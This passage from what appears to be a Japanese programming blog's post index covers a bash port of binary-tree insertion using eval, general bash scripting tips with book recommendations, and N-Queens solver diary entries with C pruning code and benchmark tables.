着目しているノード」なら左の子が、次の着目ノードとなる。\n・存在すれば、次の着目ノードに移って繰り返し。次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の左(leftChild)位置にデータを挿入。\n・目的の値 \u0026gt; 着目しているノード」なら右の子が、次の着目ノードとなる。\n・存在すれば、次の着目ノードに移って繰り返し。次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の右(rightChild)位置にデータを挿入。\nJavaのプログラムは以下の通り\npublic void insert(int id, double dd) { Node newNode = new Node(); // make new node newNode.iData = id; // insert data newNode.dData = dd; if(root==null) // no node in root root = newNode; else // root occupied { Node current = root; // start at root Node parent; while(true) // (exits internally) { parent = current; if(id \u0026lt; current.iData) // go left? { current = current.leftChild; if(current == null) // if end of the line, { // insert on left parent.leftChild = newNode; return; } } // end if go left else // or go right? { current = current.rightChild; if(current == null) // if end of the line { // insert on right parent.rightChild = newNode; return; } } // end else go right } // end while } // end else not root } // end insert() これをbashに置き換えたいのですが、nodeがオブジェクトになっているのでbashでevalを使ってオブジェクトを再現したいと思います。\nsetterメソッドがevalで動的にgetterメソッドを作成するという動きでオブジェクトを再現しています。\n#setメソッドはインスタンスのgetterメソッドを動的に生成する set_node_left() { eval \u0026#34;${1}.getLeftChild() { echo \u0026#34;$2\u0026#34;; }\u0026#34; } set_node_right() { eval \u0026#34;${1}.getRightChild() { echo \u0026#34;$2\u0026#34;; }\u0026#34; } set_node_value() { eval \u0026#34;${1}.getValue() { echo \u0026#34;$2\u0026#34;; }\u0026#34; } #インスタンスを生成する function new_node() { local node_id=\u0026#34;$1\u0026#34;; local value=\u0026#34;$2\u0026#34;; local left=\u0026#34;$3\u0026#34;; local right=\u0026#34;$4\u0026#34;; eval \u0026#34;${node_id}set=\u0026#39;set\u0026#39;\u0026#34;; eval \u0026#34;set_node_value $node_id $value\u0026#34;; eval \u0026#34;set_node_left $node_id $right\u0026#34;; eval \u0026#34;set_node_right $node_id $right\u0026#34;; } bashのプログラムは以下の通り\nfunction theTree_insert(){ local value=$1; local id=$(gen_uid); #nodeのインスタンスを生成する。 eval \u0026#34;new_node $id $value\u0026#34;; #最初にルートを設定する（初回のinsertの時だけ動く） if [ -z \u0026#34;$root\u0026#34; ];then #ルートから手順を開始する。 root=$id; else #ルートノードから値を比較しながら下のノードに移動していく current=$root; parent=\u0026#34;\u0026#34;; while true;do parent=$current; #着目しているノードと目的の値を比較する。 #目的の値 \u0026lt; 着目しているノード」なら左の子が、次の着目ノードとなる。 if [ \u0026#34;$value\u0026#34; -lt $(${current}.getValue) ];then current=$(eval ${current}.getLeftChild); #存在すれば、次の着目ノードに移って繰り返し。 if [ -z \u0026#34;$current\u0026#34; ];then #次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の左(leftChild)位置にデータを挿入。 set_node_left $parent $id; return; fi #「着目しているノード ≤ 目的の値」なら右の子が、次の着目ノードとなる。 else current=$(eval ${current}.getRightChild); #存在すれば、次の着目ノードに移って繰り返し。 if [ -z \u0026#34;$current\u0026#34; ];then #次の着目ノードが存在しなければ（現在の着目ノードが葉であれば）、一つ前の着目ノード(parent)の右(rightChild)位置にデータを挿入。 set_node_right $parent $id; return; fi fi done fi } ","date":"2022-09-27T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-27-01-ani/path_hu71550af48fd719c5bc16d756459bb446_156863_200x0_resize_box_3.png","permalink":"https://suzukiiichiro.github.io/posts/2022-09-27-01-ani/","title":"アルゴリズム日記 2022/09/27"},{"content":"ここではシェルスクリプトのBashについてのTIPSを紹介します。C言語やJavaといった高級言語にあってbashにはない部分について補完できる様々な手法をご紹介します。\nBashで普通に動くスクリプトを記述することはできるけど、C言語やJavaなどで記述したり構築したりするにはどうすればよいのか？ということについて、様々なアイディアも含めて、同等の表現方法がいくつかあるので、参考にしてください。\nシェルオプション setコマンドで便利にプログラミングする手法を紹介します。古来から伝わる便利な一行です。\n#! /usr/bin/bash set -ueo pipefail set -u : 未定義の変数を使用した箇所でスクリプトが正常終了します。変数名が異なる場合も実行できてしまうなどのありがちがバグを未然に防ぐことができます。\nset -e : スクリプトの実行中にエラーが発生した場合、エラーの箇所でスクリプトの処理が終了します。通常は、エラーが発生しても実行は中断されず、エラー箇所を特定するのはとても大変ですが、set -e オプションを付けておくとエラー箇所の特定が比較的カンタンになります。\nset -o pipefail : コマンド同士の連結にパイプ「｜」を使いますが、パイプ箇所でエラーが発生した場合に、パイプで連結したどのコマンドでエラーが発生したのかを特定することができます。\n上記３つのオプションを結合すると set -ueo pipefailをなります。通常、行頭のシェバン「#!/usr/bin/bash 」の下に一行空行を置き、その下に set -ueo pipefailを書くと良いです。\n変数の型を指定する シェルスクリプトでは変数の型を指定する必要はありませんが、指定しておくことで、間違った値を代入することがなくなり、しいてはバグが減ります。\n変数を数値として宣言する\niオプションを使用します。\ndeclare -i num=1+2 str=1+2 echo $num # =\u0026gt; 3 echo $str # =\u0026gt; 1+2 変数を配列として宣言する\naオプションを使用します。\ndeclare -a array=( Java Ruby Python ) echo ${array[0]} # =\u0026gt; Java echo ${#array[*]} #=\u0026gt; 3(配列の要素数) for e in ${array[*]} do echo $e # =\u0026gt; Java, Ruby, Pythonの順に出力 done for i in ${!array{*}} do echo ${array[i]} # =\u0026gt; Java, Ruby, Pythonの順位出力 done 変数を定数（読み取り専用）とし、初期化時に値を代入する\n-r オプションを使います。\n#!/usr/bin/bash set -ueo pipefail declare -r num=5; str=$((num+2)); echo $num # =\u0026gt; 5 echo $str # =\u0026gt; 7 ローカル変数を定義する シェルスクリプトはどこで宣言しようとすべてグローバル変数として扱われますが、localをつけることによって、明示的にもローカル変数を定義することができます。\nfunction fn() { # 問題のある例: local hoge=$(false) # $? で直前に実行したコマンドの終了ステータスを参照できる echo $? # =\u0026gt; エラーが握りつぶされ 0 が返る！ # 問題のない例: local hoge2 hoge2=$(false) echo $? # =\u0026gt; 正しく 1 が返る } インクリメント インクリメントなどは以下のように書くことができます。\n一般的な書き方\n#!/usr/bin/bash set -ueo pipefail value=0; value=`echo \u0026#34;$value+1\u0026#34; | bc`; echo \u0026#34;valueの値は \u0026#34; $value; スッキリとした書き方\n#!/usr/bin/bash set -uo pipefail # eをつけると動きません declare -i value=0; ((value++)); echo \u0026#34;valueの値は\u0026#34; $value; if C言語やJavaのような条件式で記述する メリットは以下のとおりです。\n・半角空白を配置する必要がない\n・一般的に短い行で記述できるようになる\n・条件式の変数に「$」を付ける必要がない\n・-gt は \u0026gt;、 -lt は \u0026lt;、-leは\u0026lt;=、で普通に記述できる\n一般的な記述\n#!/usr/bin/bash set -ueo pipefail x=4; if [ \u0026#34;$x\u0026#34; -gt 2 ] \u0026amp;\u0026amp; [ \u0026#34;$x\u0026#34; -le 5 ]; then echo \u0026#34;$x は 2 より大きいかつ 5 以下です\u0026#34;; fi 拡張した記述\n#!/usr/bin/bash set -ueo pipefail x=4; if ((x\u0026gt;2 \u0026amp;\u0026amp; x\u0026lt;=5)); then echo \u0026#34;$x は 2 より大きいかつ 5 以下です\u0026#34;; fi while C言語やJavaのような条件式で記述する スッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail declare -i i=0; while((i++\u0026lt;10));do echo $i; done for C言語やJavaのような条件式で記述する スッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail for((i=1;i\u0026lt;=10;i++));do echo $i; done doやdoneを使わないもっとスッキリとした書き方\n#!/usr/bin/bash set -ueo pipefail for((i=1;i\u0026lt;=10;i++)){ echo $i; } grepで該当文字列があったら反応する # 一般的には以下のようにします。 if cat hoge.txt | grep \u0026#34;Apple\u0026#34; \u0026gt;/dev/null; then echo \u0026#34;hoge.txtにはAppleが含まれた行がある\u0026#34; fi # --quiet は標準出力に何も書き出さないオプション if cat hoge.txt | grep --quiet \u0026#34;Apple\u0026#34;; then echo \u0026#34;hoge.txtにはAppleが含まれた行がある\u0026#34; fi # 条件の反転は ! をつける if ! cat hoge.txt | grep --quiet \u0026#34;Apple\u0026#34;; then echo \u0026#34;hoge.txtにはAppleが含まれた行がない\u0026#34; fi 長い行の改行について 長い行の改行はバックスラッシュを末尾につける\naws --region ap-northeast-1 cloudformation deploy \\ --template-file ./packaged-template.yaml \\ --stack-name example-stack \\ --capabilities CAPABILITY_IAM \\ --parameter-overrides \\ Environment=development \\ EnableDebugLog=true 驚いたことに（僕も驚きました）パイプラインでの改行はエスケープがいらない！\ncat access.log | # IPアドレスのカラムを取得する awk \u0026#39;{print $5}\u0026#39; | # 100行目以降のみを集計対象とする tail +100 | # IPアドレスごとのアクセス数のランキングを集計する sort | uniq -c | sort -nr 関数パラメータは変数に格納する 関数に渡された値は $1,$2\u0026hellip;というふうにアクセスできます。\nとはいえ、関数の中で $1,$2を使うとなにがなんだかわかりにくくなります。\nですので、関数冒頭で変数に格納しましょう。\nもちろん忘れずに変数にはlocal 変数をつけましょう。\n変数の型がわかっているのであれば（わかっているでしょう）、declare -i などで明示的に変数の型を指定するのが望ましいのです。\nfunction do_something() { # まず最初に引数を意味のある命名の変数に取り出す local target_dir; local action target_dir=$1; action=$2; } スクリプトのデバッグ Bashは広範なデバッグ機能を提供しています。\nデバッグの方法は３種類あります\n１．ターミナルの実行時に -x オプションを付与する\n$ bash -x helloScript.sh ２．ソースコードの冒頭のシェバンに -x オプションを付与する\n#!/bin/bash -x : : ３．デバッグの開始点と終了点を決めてデバッグ\nデバッグの開始点にコマンド \u0026lsquo;set -x\u0026rsquo;終了点には \u0026lsquo;set +x\u0026rsquo; と書きます。\n#!/bin/bash set -x echo \u0026#34;置き換えたいファイル名を入寮して下さい。\u0026#34; read fileName set +x if [[ -f \u0026#34;$fileName\u0026#34; ]]; then sed -e \u0026#34;s/Linux/Unix/g\u0026#34; \u0026#34;$fileName\u0026#34;; else echo \u0026#34;$fileName はありません。\u0026#34;; fi $ bash test + echo 置き換えたいファイル名を入寮して下さい。 置き換えたいファイル名を入寮して下さい。 + read fileName grepfile.txt + set +x This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC This is Unix This is Windows This is MAC $ #!/bin/bash # デバッグ開始 set -x var1=`date +%M` # デバッグ終了 set +x var2=`ls -1 | wc -l` var3=\u0026#34;DEBUG TEST\u0026#34; exit 0 $ bash debug3.sh ++ date +%M + var1=56 + set +x $ ヒント 色々と便利なbashですが、これからも便利な書き方があれば更新してきます。 マルチラインコメント 複数行コメントの使用\nbashではさまざまな方法で複数行コメントを使用できます。\n次の例に簡単な方法を示します。\n\u0026lsquo;multiline-comment.sh\u0026rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。\nここでは、「:」と「\u0026rsquo;」でbashで複数行コメントを実現しています。\n次のスクリプトは、5の2乗を計算します。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; 次のスクリプトは、 数値の2乗値5を計算します。 \u0026#39; ((area=5*5)); echo \u0026#34;$area\u0026#34;; bashコマンドでファイルを実行します。\n$ bash multiline-comment.sh 25 $ ヒント 多くの場合、マルチラインコメントの存在は知られていない。 ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。 それは、過去のメジャーソースコードの冒頭にそうあるからだ。 そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。 今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:\u0026gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。\nif [ \u0026ldquo;$v\u0026rdquo; -eq 5 ];then\n: # 何もしない fi touchは既にファイルがあれば、そのファイルにはさわらない。\n:\u0026gt; は既にファイルがあれば、そのファイルさえも空にする。 上記 if 文の中の : は　何もしないことを示す。 マルチラインコメントも同じ「:」から始まり、何もしないことを示している。 文字列からの配列の代入 一般的なwhile read 文。配列の内容を別の配列にコピーしています。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); declare -i number=0; # 変数は数値型 declare -a my_array; # 変数は配列型 while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) echo ${my_array[@]}; 修正したスクリプト。while read がまるごと不要となっていますね。\n#!/usr/bin/bash declare -a month_array=(\u0026#34;jan feb mar apr\u0026#34;); # コメントアウト # declare -i number=0; # 空白を区切り文字として配列に代入 declare -a my_array=(${month_array// / }); : \u0026#39; コメントアウト while read number;do my_array[$number]=${month_array[$number]}; let number++; done\u0026lt; \u0026lt;( seq 0 4) \u0026#39; echo ${my_array[@]}; 書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-26T14:19:38+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/","title":"【TIPS】ざっくりわかるシェルスクリプト"},{"content":"9月15日 グラフ理論を使ってエイトクイーンを解く方法があるらしい。\nNetworkXを使ってエイト・クイーンパズルを解く\nhttps://analytics-note.xyz/graph-theory/networkx-eight-queens-puzzle/\nまず、すべて効き筋同士をノードをつないぐ補グラフという仕組みを使うと、\n効き筋を通らない道筋を取得できfind_cliquesメソッドを使うと一発で解がわかるものみたい。\nまず、すべて効き筋同士をノードをつないだリストを作らないと行けないので行数が多くなるとメモリが足りなくなるので全てをエイトクイーンではできなさそう。\nでも、2行だけとか２列だけとかには使えそうなので調べてみると面白いかも。\npythonの初歩的なプログラムでちょっとつまったのでメモ\nanswers = [ clieque for clieque in nx.find_cliques(G_complement) if len(clieque) == bord_size ] こうかくとif 文の条件に合致したものだけリストに追加されるみたい。\nリスト内包表記というらしい。\n","date":"2022-09-15T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-15-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-15-01-ani/","title":"NQueen日記 2022/09/15"},{"content":"9月9日 数が合わない点はsymmetryOps内での単純なコードの間違えだったため修正して数が合った。\nただ、速度が過去のロジックより２０％遅い。\nそこで、symmetryOpsを突破した数を調査してみた。\nKOHO2,KOHO4,KOHO8がそれぞれsymmetryOps を突破してCOUNT２,COUNT4,COUNT8の候補となったもの。\n数を出したところ、今のロジックは過去のロジックよりKOHO8の数が倍くらい多い。\n今のロジック ６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00:STEP:6:KOHO2:1:KOHO4:0:KOHO8:0 5: 10 2 0.00:STEP:16:KOHO2:1:KOHO4:0:KOHO8:1 6: 4 1 0.00:STEP:55:KOHO2:1:KOHO4:1:KOHO8:3 7: 40 6 0.00:STEP:285:KOHO2:1:KOHO4:2:KOHO8:46 8: 92 12 0.00:STEP:1651:KOHO2:1:KOHO4:8:KOHO8:381 9: 352 46 0.00:STEP:7022:KOHO2:1:KOHO4:11:KOHO8:1889 10: 724 92 0.00:STEP:24935:KOHO2:5:KOHO4:38:KOHO8:6750 11: 2680 341 0.01:STEP:79391:KOHO2:5:KOHO4:47:KOHO8:22318 12: 14200 1788 0.03:STEP:237005:KOHO2:13:KOHO4:170:KOHO8:68576 13: 73712 9237 0.11:STEP:644806:KOHO2:13:KOHO4:191:KOHO8:198982 14: 365596 45771 0.51:STEP:1635763:KOHO2:25:KOHO4:574:KOHO8:539368 15: 2279184 285095 2.62:STEP:3843863:KOHO2:25:KOHO4:615:KOHO8:1373396 16: 14772512 1847425 15.11:STEP:8488361:KOHO2:41:KOHO4:1514:KOHO8:3265841 17: 95815104 11979381 1:38.70:STEP:17643021:KOHO2:41:KOHO4:1583:KOHO8:7307235 今までのロジック ６．nq27 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00:STEP:31:KOHO2:1:KOHO4:0:KOHO8:0 5: 10 2 0.00:STEP:153:KOHO2:1:KOHO4:0:KOHO8:2 6: 4 1 0.00:STEP:592:KOHO2:1:KOHO4:1:KOHO8:6 7: 40 6 0.00:STEP:2629:KOHO2:1:KOHO4:2:KOHO8:29 8: 92 12 0.00:STEP:12195:KOHO2:1:KOHO4:8:KOHO8:170 9: 352 46 0.00:STEP:52319:KOHO2:1:KOHO4:11:KOHO8:849 10: 724 92 0.00:STEP:199807:KOHO2:5:KOHO4:38:KOHO8:3696 11: 2680 341 0.01:STEP:675495:KOHO2:5:KOHO4:47:KOHO8:14614 12: 14200 1788 0.04:STEP:2010177:KOHO2:13:KOHO4:170:KOHO8:51301 13: 73712 9237 0.12:STEP:5362062:KOHO2:13:KOHO4:191:KOHO8:163839 14: 365596 45771 0.43:STEP:12987395:KOHO2:25:KOHO4:574:KOHO8:473312 15: 2279184 285095 1.93:STEP:29011301:KOHO2:25:KOHO4:615:KOHO8:1257054 16: 14772512 1847425 10.75:STEP:60470849:KOHO2:41:KOHO4:1514:KOHO8:3071660 17: 95815104 11979381 1:09.18:STEP:118819519:KOHO2:41:KOHO4:1583:KOHO8:6997422 調査したところ\nbacktrack1のところでsymmetryOpsをせずにKOHO8としてそのままnqueenに移行していたのが原因だった。\n上下左右2行２列全てにクイーン置けてないもの（例えば上下左は2行置けたが右は1行しか置けてないとか）を弾くようにしたらKOHO8の数も同じになった。\n上下左右2行２列にクイーンを置けないものは到達する可能性がないということが明らかになった。\n","date":"2022-09-09T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-09-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-09-01-ani/","title":"NQueen日記 2022/09/09"},{"content":"9月5日 n13でsymmetryOps v2 とv1での違いを調査する。\n正確な回答 v1の方が数が多いのでv1だけsymmetryOpsを突破したものを抽出してみた。\nどうも、２辺、３辺が同じものについて違いが出てるようだ。\nsym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:4,r0:2,r1:5 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:4,r0:2,r1:6 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:4,r0:2,r1:7 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:5,r0:2,r1:5 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:5,r0:2,r1:6 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:6,r0:2,r1:5 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:6,r0:2,r1:7 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:7,r0:2,r1:6 sym:2:t0:2,t1:4,l0:2,l1:4,b0:2,b1:7,r0:2,r1:7 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:2,r1:6 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:2,r1:8 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:6,r0:2,r1:8 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:8,r0:2,r1:6 sym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:8,r0:2,r1:8 sym:2:t0:2,t1:7,l0:2,l1:7,b0:2,b1:7,r0:2,r1:8 sym:2:t0:2,t1:7,l0:2,l1:7,b0:2,b1:8,r0:2,r1:8 sym:2:t0:3,t1:5,l0:3,l1:5,b0:3,b1:5,r0:3,r1:6 sym:2:t0:4,t1:2,l0:4,l1:2,b0:4,b1:2,r0:4,r1:6 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:2,r0:5,r1:3 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:2,r0:5,r1:9 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:3,r0:5,r1:3 sym:2:t0:5,t1:2,l0:5,l1:2,b0:5,b1:9,r0:5,r1:9 sym:2:t0:5,t1:3,l0:5,l1:3,b0:5,b1:10,r0:5,r1:10 sym:2:t0:5,t1:3,l0:5,l1:3,b0:5,b1:3,r0:5,r1:10 sym:2:t0:5,t1:9,l0:5,l1:9,b0:5,b1:10,r0:5,r1:10 sym:2:t0:5,t1:9,l0:5,l1:9,b0:5,b1:9,r0:5,r1:10 まず、この中から最終行まで行ったものをピックアップしてみる\n以下の2つが最終行まで行っていた。\n３辺が同じパターンだ。symmetryOps v2はこれを弾いてしまっているが突破させてあげるのが正解。\n何故弾いているのか調査してみたいと思う。\nsym:2:t0:2,t1:5,l0:2,l1:5,b0:2,b1:5,r0:2,r1:6 12 11 10 9 8 7 6 5 4 3 2 1 0 ======================================= 0| 0000000000100 1| 0000000100000 2| 1000000000000 3| 0000000000000 4| 0000000000000 5| 0100000000000 6| 0000000000010 7| 0000000000000 8| 0000000000000 9| 0000000000000 10| 0000000000001 11| 0000010000000 12| 0010000000000 sym:2:t0:2,t1:7,l0:2,l1:7,b0:2,b1:7,r0:2,r1:8 12 11 10 9 8 7 6 5 4 3 2 1 0 ======================================= 0| 0000000000100 1| 0000010000000 2| 1000000000000 3| 0000000000000 4| 0000000000010 5| 0000000000000 6| 0000000000000 7| 0100000000000 8| 0000000000000 9| 0000000000000 10| 0000000000001 11| 0000000100000 12| 0010000000000 ","date":"2022-09-05T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-05-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-05-01-ani/","title":"NQueen日記 2022/09/05"},{"content":"9月2日 正しい結果と間違った結果のtop,left,bottom,rightの値を比較してみる。\n間違った結果の方が数が多いので、間違っている方だけsymmetryOpsを突破しているものを抽出して見た。\nsym:2:t0:2,t1:5,l0:6,l1:3,b0:3,b1:0,r0:3,r1:5 sym:2:t0:2,t1:6,l0:3,l1:1,b0:2,b1:7,r0:1,r1:3 sym:2:t0:2,t1:6,l0:3,l1:1,b0:2,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:3,l1:1,b0:3,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:4,l1:1,b0:2,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:4,l1:1,b0:4,b1:7,r0:1,r1:4 sym:2:t0:2,t1:6,l0:4,l1:1,b0:4,b1:7,r0:1,r1:5 sym:2:t0:2,t1:6,l0:6,l1:1,b0:3,b1:0,r0:3,r1:5 sym:2:t0:3,t1:1,l0:5,l1:2,b0:3,b1:7,r0:1,r1:6 sym:2:t0:3,t1:6,l0:5,l1:1,b0:3,b1:7,r0:1,r1:4 試しにクイーンの配置を出力してみると\n7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 01000000 4| 00000001 5| 00000000 6| 10000000 7| 00010000 6で左端にクイーンが置かれているが、これだと時計回りに90度回転すると、1行目のクイーンの位置が右から2列目になる。 1行目のクイーンの配置は右から3列目なので最小にならない。 下部サイド枝刈りが機能していれば6,7の両端にクイーンは置けない。 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 01000000 4| 00000001 5| 00000000 6| x000000x 7| x001000x これは下部サイド枝刈りで枝刈りされているはずなのにうまく機能していない模様\n//【枝刈り】下部サイド枝刈り }else if(row==BOUND2) { //printf(\u0026#34;sidemask:row:%d BOUND2:%d SIDEMASK:%ld down:%ld\\n\u0026#34;,row,BOUND2,SIDEMASK,down); if((down\u0026amp;SIDEMASK)==0){ //printf(\u0026#34;eda_1\\n\u0026#34;); return; } if((down\u0026amp;SIDEMASK)!=SIDEMASK){ //printf(\u0026#34;eda_2\\n\u0026#34;); //printf(\u0026#34;before:%ld\u0026#34;,bitmap); bitmap\u0026amp;=SIDEMASK; //printf(\u0026#34;after:%ld\u0026#34;,bitmap); } 調べたところ、5(row==BOUND2)でクイーンを置かない場合に下部サイド枝刈りが効いていないようだ。\nクイーンを置かないで飛ばした場合も下部サイド枝刈りが効くようにする必要がある。\nrow\u0026gt;BOUND2の時はSIDEMASK(両端)にクイーンを置けないように修正した。\n}else if(row \u0026gt; BOUND2){ bitmap\u0026amp;=~SIDEMASK; } N12まで数はあったがN13以降逆に少なくなったので調査することにする。\n６．CPUR 再帰 バックトラック＋ビットマップ N: Total Unique hh:mm:ss.ms 4: 2 1 0.00 5: 10 2 0.00 6: 4 1 0.00 7: 40 6 0.00 8: 92 12 0.00 9: 352 46 0.00 10: 724 92 0.00 11: 2680 341 0.01 12: 14200 1788 0.02 13: 73696 9235 0.10 14: 365564 45767 0.42 15: 2278976 285069 2.11 16: 14771576 1847308 12.39 17: 95809192 11978642 1:22.17 ","date":"2022-09-02T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-02-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-09-02-01-ani/","title":"NQueen日記 2022/09/02"},{"content":"8月30日 枝刈りを追加した。\n追加前よりなぜか遅くなった。\nsymmetryOpsのロジックを変えると速くなるだろうか。\n枝刈りを追加することによって回転対称チェック、ミラー判定を減らせるはずなのでsymmetryOpsを軽くできるはず。\n枝刈り追加前 15: 2279184 285095 2.43 16: 14772512 1847425 12.01 17: 95815104 11979381 1:12.26 枝刈り追加後 15: 2279184 285095 2.18 16: 14772512 1847425 12.55 17: 95815104 11979381 1:20.44 １行目角にクイーンがある場合はミラー判定だけ必要\nミラー判定についても、主対角線鏡像のみを判定すればよい\nif(row\u0026lt;BOUND1) { bitmap\u0026amp;=~2; // bm|=2; bm^=2; (bm\u0026amp;=~2と同等) } １行目角にクイーンが無い場合、クイーン位置より右位置の８対称位置にクイーンを置くことはできない\n//【枝刈り】上部サイド枝刈り if(row\u0026lt;BOUND1){ bitmap\u0026amp;=~SIDEMASK; //【枝刈り】下部サイド枝刈り }else if(row==BOUND2) { if((down\u0026amp;SIDEMASK)==0){ return; } if((down\u0026amp;SIDEMASK)!=SIDEMASK){ bitmap\u0026amp;=SIDEMASK; } //【枝刈り】最下段枝刈り }else if(row == size-1){ bitmap\u0026amp;=~LASTMASK; } ","date":"2022-08-30T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-30-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-30-01-ani/","title":"NQueen日記 2022/08/30"},{"content":"8月29日 ミラー処理を入れてみた。\nミラー処理は1行目については右側半分だけクイーンを置くというもの\n奇数の場合は真ん中もやる。\nミラー処理を適用した結果適用前より少し速くなった。\nnの数が増えるほど効果が弱まっているのはきになる。\nまずは、引き続き枝刈り処理を追加していこうと思う。\nvoid NQueenR(int size,long mask,int 